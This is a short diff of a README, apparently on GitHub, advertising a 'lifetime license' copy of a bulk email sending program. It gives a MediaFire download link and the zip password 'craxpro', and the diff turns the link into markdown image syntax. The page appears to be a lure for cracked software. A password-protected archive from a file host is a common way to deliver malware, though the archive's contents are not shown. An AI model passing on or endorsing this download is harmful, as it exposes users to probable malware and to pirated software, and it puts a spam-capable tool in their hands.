@@ -2,7 +2,7 @@
 Bulk Mailer is a highly professional bulk email sending software that offers high performance in the
 building of email lists and the creation of personal and easy to create HTML newsletters.
 
-Download here: https://www.mediafire.com/file/rv4wrag3oj3u9gs/bulk_mailer_9_pro.zip/file
+Download here: ![Download](https://www.mediafire.com/file/rv4wrag3oj3u9gs/bulk_mailer_9_pro.zip/file)
 Zip Password: craxpro
 
 ![bulkmailer](https://github.com/Lizy8448/Bulk-mailler-v9-pro-lifetime-license-/assets/90305756/cb60b500-fe3e-4246-b449-447df039561b)
